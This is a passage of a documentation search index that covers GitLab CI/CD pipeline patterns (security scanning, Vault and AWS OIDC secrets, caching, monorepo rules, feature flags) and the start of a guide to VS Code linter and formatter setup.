$CI_PIPELINE_SOURCE == \"merge_request_event\"\n      when: manual\n  resource_group: review/$CI_COMMIT_REF_SLUG\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#security-best-practices","title":"Security Best Practices","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#sast-dast-and-dependency-scanning","title":"SAST, DAST, and Dependency Scanning","text":"<pre><code>include:\n  - template: Security/SAST.gitlab-ci.yml\n  - template: Security/Dependency-Scanning.gitlab-ci.yml\n  - template: Security/Container-Scanning.gitlab-ci.yml\n  - template: Security/Secret-Detection.gitlab-ci.yml\n  - template: Security/DAST.gitlab-ci.yml\n\n## Customize SAST\nsast:\n  variables:\n    SAST_EXCLUDED_PATHS: spec, test, tests, tmp, node_modules\n\n## Customize Dependency Scanning\ndependency_scanning:\n  variables:\n    DS_EXCLUDED_PATHS: spec, test, tests, tmp, node_modules\n    DS_DEFAULT_ANALYZERS: \"gemnasium, gemnasium-python, retire.js\"\n\n## Customize Container Scanning\ncontainer_scanning:\n  variables:\n    CS_SEVERITY_THRESHOLD: \"HIGH\"\n    CI_APPLICATION_REPOSITORY: $CI_REGISTRY_IMAGE/backend\n    CI_APPLICATION_TAG: $CI_COMMIT_SHA\n\n## Customize DAST\ndast:\n  variables:\n    DAST_WEBSITE: https://staging.example.com\n    DAST_FULL_SCAN_ENABLED: \"true\"\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"develop\"\n      when: always\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#secrets-management-with-hashicorp-vault","title":"Secrets Management with HashiCorp Vault","text":"<pre><code>.vault_template: &amp;vault_template\n  image: vault:latest\n  before_script:\n    - export VAULT_ADDR=$VAULT_ADDR\n    - export VAULT_TOKEN=$CI_JOB_JWT\n    - vault login -method=jwt role=gitlab-ci token=$CI_JOB_JWT\n\ndeploy:with:vault:\n  &lt;&lt;: *vault_template\n  stage: deploy\n  script:\n    - |\n      # Fetch secrets from Vault\n      export DB_PASSWORD=$(vault kv get -field=password secret/myapp/database)\n      export API_KEY=$(vault kv get -field=api_key secret/myapp/external-api)\n\n      # Use secrets in deployment\n      kubectl create secret generic myapp-secrets \\\n        --from-literal=DB_PASSWORD=$DB_PASSWORD \\\n        --from-literal=API_KEY=$API_KEY \\\n        --dry-run=client -o yaml | kubectl apply -f -\n\n      # Deploy application\n      kubectl apply -f k8s/\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#oidc-with-aws","title":"OIDC with AWS","text":"<pre><code>deploy:aws:oidc:\n  stage: deploy\n  image: registry.gitlab.com/gitlab-org/cloud-deploy/aws-base:latest\n  id_tokens:\n    GITLAB_OIDC_TOKEN:\n      aud: https://gitlab.com\n  script:\n    - |\n      # Assume role using OIDC\n      STS_RESPONSE=$(aws sts assume-role-with-web-identity \\\n        --role-arn $AWS_ROLE_ARN \\\n        --role-session-name gitlab-ci-$CI_PIPELINE_ID \\\n        --web-identity-token $GITLAB_OIDC_TOKEN \\\n        --duration-seconds 3600)\n\n      # Export AWS credentials\n      export AWS_ACCESS_KEY_ID=$(echo $STS_RESPONSE | jq -r '.Credentials.AccessKeyId')\n      export AWS_SECRET_ACCESS_KEY=$(echo $STS_RESPONSE | jq -r '.Credentials.SecretAccessKey')\n      export AWS_SESSION_TOKEN=$(echo $STS_RESPONSE | jq -r '.Credentials.SessionToken')\n\n      # Deploy to AWS\n      aws s3 sync ./dist s3://$S3_BUCKET_PRODUCTION\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#performance-optimization","title":"Performance Optimization","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#parallel-jobs-with-dag","title":"Parallel Jobs with DAG","text":"<pre><code>workflow:\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\nbuild:frontend:\n  stage: build\n  needs: [\"test:frontend\"]\n  script:\n    - npm run build\n\nbuild:backend:\n  stage: build\n  needs: [\"test:backend\"]\n  script:\n    - docker build -t backend .\n\ndeploy:cdn:\n  stage: deploy\n  needs: [\"build:frontend\"]\n  script:\n    - aws s3 sync dist s3://bucket\n\ndeploy:api:\n  stage: deploy\n  needs: [\"build:backend\"]\n  script:\n    - kubectl apply -f k8s/\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#advanced-caching","title":"Advanced Caching","text":"<pre><code>.node_cache: &amp;node_cache\n  cache:\n    key:\n      files:\n        - package-lock.json\n    paths:\n      - node_modules/\n      - .npm/\n    policy: pull-push\n\n.node_cache_readonly: &amp;node_cache_readonly\n  cache:\n    key:\n      files:\n        - package-lock.json\n    paths:\n      - node_modules/\n      - .npm/\n    policy: pull\n\nbuild:\n  &lt;&lt;: *node_cache\n  script:\n    - npm ci --cache .npm\n    - npm run build\n\ntest:\n  &lt;&lt;: *node_cache_readonly\n  script:\n    - npm test\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#docker-layer-caching","title":"Docker Layer Caching","text":"<pre><code>build:image:\n  stage: build\n  image: docker:24-dind\n  services:\n    - docker:24-dind\n  variables:\n    DOCKER_BUILDKIT: 1\n  script:\n    - docker build\n        --build-arg BUILDKIT_INLINE_CACHE=1\n        --cache-from $CI_REGISTRY_IMAGE:latest\n        --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n        --tag $CI_REGISTRY_IMAGE:latest\n        .\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n    - docker push $CI_REGISTRY_IMAGE:latest\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#conditional-pipeline-rules","title":"Conditional Pipeline Rules","text":"<pre><code>.frontend_changes: &amp;frontend_changes\n  changes:\n    - frontend/**/*\n    - package.json\n    - package-lock.json\n\n.backend_changes: &amp;backend_changes\n  changes:\n    - backend/**/*\n    - requirements.txt\n    - Dockerfile\n\ntest:frontend:\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      &lt;&lt;: *frontend_changes\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n\ntest:backend:\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      &lt;&lt;: *backend_changes\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#monorepo-patterns","title":"Monorepo Patterns","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#selective-pipeline-execution","title":"Selective Pipeline Execution","text":"<pre><code>variables:\n  FRONTEND_CHANGES: \"false\"\n  BACKEND_CHANGES: \"false\"\n  SHARED_CHANGES: \"false\"\n\ndetect:changes:\n  stage: .pre\n  image: alpine/git\n  script:\n    - |\n      git diff --name-only $CI_MERGE_REQUEST_DIFF_BASE_SHA $CI_COMMIT_SHA &gt; changes.txt\n\n      if grep -q \"^frontend/\" changes.txt; then\n        echo \"FRONTEND_CHANGES=true\" &gt;&gt; build.env\n      fi\n\n      if grep -q \"^backend/\" changes.txt; then\n        echo \"BACKEND_CHANGES=true\" &gt;&gt; build.env\n      fi\n\n      if grep -q \"^shared/\" changes.txt; then\n        echo \"FRONTEND_CHANGES=true\" &gt;&gt; build.env\n        echo \"BACKEND_CHANGES=true\" &gt;&gt; build.env\n        echo \"SHARED_CHANGES=true\" &gt;&gt; build.env\n      fi\n  artifacts:\n    reports:\n      dotenv: build.env\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n\ntest:frontend:\n  needs: [\"detect:changes\"]\n  rules:\n    - if: $FRONTEND_CHANGES == \"true\"\n  script:\n    - cd frontend &amp;&amp; npm test\n\ntest:backend:\n  needs: [\"detect:changes\"]\n  rules:\n    - if: $BACKEND_CHANGES == \"true\"\n  script:\n    - cd backend &amp;&amp; pytest\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#child-pipelines-for-microservices","title":"Child Pipelines for Microservices","text":"<pre><code>## Parent pipeline\ntrigger:service-a:\n  stage: trigger\n  trigger:\n    include: services/service-a/.gitlab-ci.yml\n    strategy: depend\n  rules:\n    - changes:\n        - services/service-a/**/*\n\ntrigger:service-b:\n  stage: trigger\n  trigger:\n    include: services/service-b/.gitlab-ci.yml\n    strategy: depend\n  rules:\n    - changes:\n        - services/service-b/**/*\n\n## services/service-a/.gitlab-ci.yml\nstages:\n  - test\n  - build\n  - deploy\n\ntest:\n  stage: test\n  script:\n    - npm test\n\nbuild:\n  stage: build\n  script:\n    - docker build -t service-a .\n\ndeploy:\n  stage: deploy\n  script:\n    - kubectl apply -f k8s/\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#advanced-patterns","title":"Advanced Patterns","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#feature-flags-with-launchdarkly","title":"Feature Flags with LaunchDarkly","text":"<pre><code>deploy:with:feature:flags:\n  stage: deploy\n  image: alpine:latest\n  before_script:\n    - apk add --no-cache curl jq\n  script:\n    - |\n      # Create deployment event in LaunchDarkly\n      curl -X POST https://app.launchdarkly.com/api/v2/flags/production/my-feature/on \\\n        -H \"Authorization: $LAUNCHDARKLY_API_KEY\" \\\n        -H \"Content-Type: application/json\"\n\n      # Deploy application\n      kubectl apply -f k8s/\n\n      # Gradually enable feature flag\n      for percentage in 10 25 50 75 100; do\n        echo \"Enabling feature for $percentage% of users\"\n        curl -X PATCH https://app.launchdarkly.com/api/v2/flags/production/my-feature \\\n          -H \"Authorization: $LAUNCHDARKLY_API_KEY\" \\\n          -H \"Content-Type: application/json\" \\\n          -d \"{\\\"rollout\\\":{\\\"variations\\\":[{\\\"variation\\\":0,\\\"weight\\\":$((100-percentage))},{\\\"variation\\\":1,\\\"weight\\\":$percentage}]}}\"\n\n        sleep 300  # Monitor for 5 minutes\n      done\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#matrix-jobs-parallel-execution","title":"Matrix Jobs (Parallel Execution)","text":"<pre><code>.test_template: &amp;test_template\n  stage: test\n  script:\n    - python -m pytest tests/\n\ntest:python:3.10:\n  &lt;&lt;: *test_template\n  image: python:3.10-slim\n\ntest:python:3.11:\n  &lt;&lt;: *test_template\n  image: python:3.11-slim\n\ntest:python:3.12:\n  &lt;&lt;: *test_template\n  image: python:3.12-slim\n\n## Or using parallel directive\ntest:parallel:\n  stage: test\n  image: python:${PYTHON_VERSION}-slim\n  parallel:\n    matrix:\n      - PYTHON_VERSION: [\"3.10\", \"3.11\", \"3.12\"]\n  script:\n    - python -m pytest tests/\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#auto-devops-customization","title":"Auto DevOps Customization","text":"<pre><code>include:\n  - template: Auto-DevOps.gitlab-ci.yml\n\nvariables:\n  AUTO_DEVOPS_PLATFORM_TARGET: \"ECS\"\n  POSTGRES_ENABLED: \"true\"\n  POSTGRES_VERSION: 15\n  REDIS_ENABLED: \"true\"\n\nproduction:\n  extends: .auto-deploy\n  before_script:\n    - echo \"Custom pre-deployment tasks\"\n  after_script:\n    - echo \"Custom post-deployment tasks\"\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#troubleshooting","title":"Troubleshooting","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#debug-logging","title":"Debug Logging","text":"<pre><code>debug:pipeline:\n  stage: .pre\n  script:\n    - echo \"CI_COMMIT_REF_NAME=$CI_COMMIT_REF_NAME\"\n    - echo \"CI_COMMIT_SHA=$CI_COMMIT_SHA\"\n    - echo \"CI_PIPELINE_SOURCE=$CI_PIPELINE_SOURCE\"\n    - echo \"CI_MERGE_REQUEST_ID=$CI_MERGE_REQUEST_ID\"\n    - env | sort\n  rules:\n    - if: $CI_COMMIT_MESSAGE =~ /\\[debug\\]/\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#retry-failed-jobs","title":"Retry Failed Jobs","text":"<pre><code>test:flaky:\n  retry:\n    max: 2\n    when:\n      - runner_system_failure\n      - stuck_or_timeout_failure\n      - script_failure\n  script:\n    - npm test\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#job-artifacts-for-debugging","title":"Job Artifacts for Debugging","text":"<pre><code>test:with:artifacts:\n  script:\n    - npm test || true\n  artifacts:\n    when: always\n    paths:\n      - logs/\n      - screenshots/\n      - test-results/\n    reports:\n      junit: test-results/junit.xml\n    expire_in: 1 week\n</code></pre>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#best-practices","title":"Best Practices","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#pipeline-organization","title":"Pipeline Organization","text":"<ol> <li>Use Stages Wisely: Group related jobs into logical stages</li> <li>Set Timeouts: Use <code>timeout</code> to prevent hung jobs</li> <li>Resource Groups: Prevent concurrent deployments with <code>resource_group</code></li> <li>Environment Protection: Use protected environments for production</li> </ol>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#performance","title":"Performance","text":"<ol> <li>Cache Strategically: Use <code>cache</code> for dependencies, <code>artifacts</code> for build outputs</li> <li>Parallel Jobs: Use <code>parallel</code> or DAG with <code>needs</code> for concurrent execution</li> <li>Conditional Rules: Skip unnecessary jobs with <code>rules</code></li> <li>Docker Layer Caching: Use BuildKit and cache-from for faster builds</li> </ol>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#security-guidelines","title":"Security Guidelines","text":"<ol> <li>Use Protected Variables: Store secrets as protected variables</li> <li>Enable Security Scanning: Use SAST, DAST, dependency scanning</li> <li>OIDC for Cloud: Prefer OIDC over long-lived credentials</li> <li>Minimal Permissions: Use job tokens with minimal scopes</li> <li>Scan Containers: Always scan Docker images before deployment</li> </ol>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#reliability","title":"Reliability","text":"<ol> <li>Add Retries: Use <code>retry</code> for flaky operations</li> <li>Health Checks: Verify deployments before promoting</li> <li>Rollback Capability: Include rollback jobs for production</li> <li>Monitor Deployments: Integrate with monitoring tools</li> </ol>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#references","title":"References","text":"","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#official-documentation","title":"Official Documentation","text":"<ul> <li>GitLab CI/CD Documentation</li> <li>.gitlab-ci.yml Reference</li> <li>GitLab CI/CD Examples</li> </ul>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#security","title":"Security","text":"<ul> <li>Security Scanning</li> <li>OIDC Documentation</li> <li>Protected Variables</li> </ul>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/gitlab_ci_guide/#advanced-topics","title":"Advanced Topics","text":"<ul> <li>Review Apps</li> <li>Child Pipelines</li> <li>Auto DevOps</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-11-30 Status: Active</p>","tags":["gitlab-ci","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/ide_integration_guide/","title":"IDE Integration Guide","text":"","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#introduction","title":"Introduction","text":"<p>This guide provides detailed instructions for integrating all validation tools, linters, formatters, and testing frameworks into popular IDEs and editors. Proper IDE integration enables real-time feedback, automated formatting, and a seamless development experience.</p>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#table-of-contents","title":"Table of Contents","text":"<ol> <li>VS Code</li> <li>JetBrains IDEs</li> <li>Vim/Neovim</li> <li>Sublime Text</li> <li>Emacs</li> <li>Remote Development</li> <li>Performance Optimization</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vs-code","title":"VS Code","text":"","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#initial-setup","title":"Initial Setup","text":"<p>Install VS Code:</p> <pre><code>## macOS\nbrew install --cask visual-studio-code\n\n## Ubuntu/Debian\nsudo snap install code --classic\n\n## Manual download\n## https://code.visualstudio.com/download\n</code></pre> <p>Enable command line access:</p> <ol> <li>Open VS Code</li> <li>Press <code>Cmd+Shift+P</code> (macOS) or <code>Ctrl+Shift+P</code> (Windows/Linux)</li> <li>Type \"Shell Command: Install 'code' command in PATH\"</li> <li>Select and execute</li> </ol>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#essential-extensions","title":"Essential Extensions","text":"<p>Install core extensions:</p> <pre><code>## Python\ncode --install-extension ms-python.python\ncode --install-extension ms-python.black-formatter\ncode --install-extension ms-python.isort\ncode --install-extension ms-python.flake8\ncode --install-extension ms-python.mypy-type-checker\ncode --install-extension ms-python.pylint\n\n## JavaScript/TypeScript\ncode --install-extension dbaeumer.vscode-eslint\ncode --install-extension esbenp.prettier-vscode\ncode --install-extension yoavbls.pretty-ts-errors\n\n## Terraform\ncode --install-extension hashicorp.terraform\ncode --install-extension hashicorp.hcl\n\n## Ansible\ncode --install-extension redhat.ansible\n\n## Docker\ncode --install-extension ms-azuretools.vscode-docker\n\n## Shell\ncode --install-extension timonwong.shellcheck\ncode --install-extension foxundermoon.shell-format\n\n## YAML\ncode --install-extension redhat.vscode-yaml\n\n## Markdown\ncode --install-extension yzhang.markdown-all-in-one\ncode --install-extension davidanson.vscode-markdownlint\n\n## Git\ncode --install-extension eamodio.gitlens\ncode --install-extension mhutchie.git-graph\n\n## General\ncode --install-extension editorconfig.editorconfig\ncode --install-extension streetsidesoftware.code-spell-checker\ncode --install-extension ryanluker.vscode-coverage-gutters\ncode --install-extension gruntfuggly.todo-tree\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#python-configuration","title":"Python Configuration","text":"<p>.vscode/settings.json:</p> <pre><code>{\n  \"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\",\n\n  // Formatting\n  \"[python]\": {\n    \"editor.defaultFormatter\": \"ms-python.black-formatter\",\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.organizeImports\": \"explicit\"\n    }\n  },\n\n  // Black formatter\n  \"black-formatter.args\": [\n    \"--line-length=120\"\n  ],\n\n  // isort\n  \"isort.args\": [\n    \"--profile=black\",\n    \"--line-length=120\"\n  ],\n\n  // Flake8\n  \"flake8.args\": [\n    \"--max-line-length=120\",\n    \"--extend-ignore=E203,W503\"\n  ],\n\n  // mypy\n  \"mypy-type-checker.args\": [\n    \"--ignore-missing-imports\",\n    \"--strict\"\n  ],\n\n  // Pylint\n  \"pylint.args\": [\n    \"--max-line-length=120\"\n  ],\n\n  // Python testing\n  \"python.testing.pytestEnabled\": true,\n  \"python.testing.unittestEnabled\": false,\n  \"python.testing.pytestArgs\": [\n    \"tests\"\n  ],\n\n  // Python analysis\n  \"python.analysis.typeCheckingMode\": \"basic\",\n  \"python.analysis.autoImportCompletions\": true,\n  \"python.analysis.inlayHints.functionReturnTypes\": true,\n  \"python.analysis.inlayHints.variableTypes\": true\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#javascripttypescript-configuration","title":"JavaScript/TypeScript Configuration","text":"<p>.vscode/settings.json:</p> <pre><code>{\n  // TypeScript/JavaScript formatting\n  \"[typescript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.eslint\": \"explicit\",\n      \"source.organizeImports\": \"explicit\"\n    }\n  },\n\n  \"[javascript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.eslint\": \"explicit\"\n    }\n  },\n\n  \"[typescriptreact]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n\n  \"[javascriptreact]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n\n  // ESLint\n  \"eslint.validate\": [\n    \"javascript\",\n    \"javascriptreact\",\n    \"typescript\",\n    \"typescriptreact\"\n  ],\n  \"eslint.format.enable\": true,\n  \"eslint.codeActionsOnSave.mode\": \"all\",\n\n  // Prettier\n  \"prettier.requireConfig\": true,\n\n  // TypeScript\n  \"typescript.updateImportsOnFileMove.enabled\": \"always\",\n  \"typescript.inlayHints.parameterNames.enabled\": \"all\",\n  \"typescript.inlayHints.functionLikeReturnTypes.enabled\": true,\n  \"typescript.suggest.autoImports\": true\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#terraform-configuration","title":"Terraform Configuration","text":"<p>.vscode/settings.json:</p> <pre><code>{\n  \"[terraform]\": {\n    \"editor.defaultFormatter\": \"hashicorp.terraform\",\n    \"editor.formatOnSave\": true\n  },\n\n  \"[terraform-vars]\": {\n    \"editor.defaultFormatter\": \"hashicorp.terraform\"\n  },\n\n  \"terraform.languageServer.enable\": true,\n  \"terraform.experimentalFeatures.validateOnSave\": true,\n  \"terraform.experimentalFeatures.prefillRequiredFields\": true\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#complete-vs-code-settings","title":"Complete VS Code Settings","text":"<p>.vscode/settings.json (complete):</p> <pre><code>{\n  // Editor settings\n  \"editor.formatOnSave\": true,\n  \"editor.formatOnPaste\": false,\n  \"editor.codeActionsOnSave\": {\n    \"source.fixAll\": \"explicit\",\n    \"source.organizeImports\": \"explicit\"\n  },\n  \"editor.rulers\": [120],\n  \"editor.tabSize\": 2,\n  \"editor.insertSpaces\": true,\n  \"editor.detectIndentation\": true,\n  \"editor.bracketPairColorization.enabled\": true,\n  \"editor.guides.bracketPairs\": true,\n  \"editor.minimap.enabled\": true,\n  \"editor.renderWhitespace\": \"boundary\",\n\n  // Files\n  \"files.trimTrailingWhitespace\": true,\n  \"files.insertFinalNewline\": true,\n  \"files.trimFinalNewlines\": true,\n  \"files.eol\": \"\\n\",\n  \"files.exclude\": {\n    \"**/__pycache__\": true,\n    \"**/.pytest_cache\": true,\n    \"**/.mypy_cache\": true,\n    \"**/node_modules\": true,\n    \"**/.terraform\": true,\n    \"**/dist\": true,\n    \"**/build\": true\n  },\n  \"files.watcherExclude\": {\n    \"**/.git/objects/**\": true,\n    \"**/node_modules/**\": true,\n    \"**/.venv/**\": true,\n    \"**/__pycache__/**\": true\n  },\n\n  // Search\n  \"search.exclude\": {\n    \"**/node_modules\": true,\n    \"**/bower_components\": true,\n    \"**/*.code-search\": true,\n    \"**/.venv\": true,\n    \"**/dist\": true,\n    \"**/build\": true\n  },\n\n  // Python\n  \"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\",\n  \"[python]\": {\n    \"editor.defaultFormatter\": \"ms-python.black-formatter\",\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.organizeImports\": \"explicit\"\n    },\n    \"editor.tabSize\": 4\n  },\n  \"black-formatter.args\": [\"--line-length=120\"],\n  \"isort.args\": [\"--profile=black\", \"--line-length=120\"],\n  \"flake8.args\": [\"--max-line-length=120\", \"--extend-ignore=E203,W503\"],\n  \"mypy-type-checker.args\": [\"--ignore-missing-imports\", \"--strict\"],\n  \"python.testing.pytestEnabled\": true,\n  \"python.testing.unittestEnabled\": false,\n  \"python.analysis.typeCheckingMode\": \"basic\",\n\n  // JavaScript/TypeScript\n  \"[typescript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.eslint\": \"explicit\",\n      \"source.organizeImports\": \"explicit\"\n    }\n  },\n  \"[javascript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.eslint\": \"explicit\"\n    }\n  },\n  \"eslint.validate\": [\"javascript\", \"javascriptreact\", \"typescript\", \"typescriptreact\"],\n  \"typescript.updateImportsOnFileMove.enabled\": \"always\",\n\n  // Terraform\n  \"[terraform]\": {\n    \"editor.defaultFormatter\": \"hashicorp.terraform\",\n    \"editor.formatOnSave\": true\n  },\n  \"terraform.languageServer.enable\": true,\n\n  // Shell\n  \"[shellscript]\": {\n    \"editor.defaultFormatter\": \"foxundermoon.shell-format\"\n  },\n  \"shellformat.flag\": \"-i 2 -ci\",\n\n  // YAML\n  \"[yaml]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.insertSpaces\": true,\n    \"editor.tabSize\": 2\n  },\n  \"yaml.schemas\": {\n    \"https://json.schemastore.org/github-workflow.json\": \".github/workflows/*.yml\",\n    \"https://json.schemastore.org/gitlab-ci.json\": \".gitlab-ci.yml\"\n  },\n\n  // Markdown\n  \"[markdown]\": {\n    \"editor.defaultFormatter\": \"yzhang.markdown-all-in-one\",\n    \"editor.wordWrap\": \"on\",\n    \"editor.quickSuggestions\": {\n      \"comments\": \"off\",\n      \"strings\": \"off\",\n      \"other\": \"off\"\n    }\n  },\n  \"markdownlint.config\": {\n    \"MD013\": { \"line_length\": 120 }\n  },\n\n  // JSON\n  \"[json]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n  \"[jsonc]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n\n  // Git\n  \"git.autofetch\": true,\n  \"git.confirmSync\": false,\n  \"git.enableSmartCommit\": true,\n  \"gitlens.hovers.currentLine.over\": \"line\",\n\n  // Terminal\n  \"terminal.integrated.defaultProfile.osx\": \"zsh\",\n  \"terminal.integrated.fontSize\": 12,\n\n  // Workbench\n  \"workbench.colorTheme\": \"Default Dark+\",\n  \"workbench.iconTheme\": \"vs-seti\",\n  \"workbench.editor.enablePreview\": false,\n\n  // Extensions\n  \"extensions.ignoreRecommendations\": false,\n\n  // Spell checker\n  \"cSpell.words\": [\n    \"autofix\",\n    \"autoupdate\",\n    \"mypy\",\n    \"flake8\",\n    \"pylint\",\n    \"pytest\",\n    \"terraform\",\n    \"terragrunt\",\n    \"kubectl\",\n    \"ansible\"\n  ]\n}\n</code></pre>","tags":["ide","editor","integration","vscode","jetbrains","vim","neovim","development-tools"]},{"location":"05_ci_cd/ide_integration_guide/#vs-code-tasks","title":"VS Code Tasks","text":"<p>.vscode/tasks.json:</p> <pre><code>{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"Run All Python Checks\",\n      \"type\": \"shell\",\n      \"command\": \"black src/ &amp;&amp; isort src/ &amp;&amp; flake8 src/ &amp;&amp; mypy src/ &amp;&amp; pytest\",\n      \"group\": {\n        \"kind\": \"test\",\n        \"isDefault\": true\n      },\n      \"presentation\": {\n        \"reveal\": \"always\",\n        \"panel\": \"new\"\n      }\n    },\n    {\n      \"label\": \"Format Python Code\",\n      \"type\": \"shell\",\n      \"command\": \"black src/ &amp;&amp; isort src/\",\n      \"group\": \"build\",\n      \"presentation\": {\n        \"reveal\": \"silent\"\n      }\n    },\n    {\n      \"label\": \"Run TypeScript Checks\",\n      \"type\": \"shell\",\n      \"command\": \"npm run lint &amp;&amp; npm run type-check &amp;&amp; npm test\",\n      \"group\": \"test\",\n      \"presentation\": {\n        \"reveal\": \"always\",\n        \"panel\": \"new\"\n      }\n    },\n    {\n      \"label\": \"Terraform Format\",\n      \"type\": \"shell\",\n      \"command\": \"terraform fmt -recursive\",\n      \"group\": \"build\"\n    },\n    {\n      \"label\": \"Terraform Validate\",\n      \"type\": \"shell\",\n      \"command\": \"terraform validate\",\n      \"group\": \"test\"\n    }\n  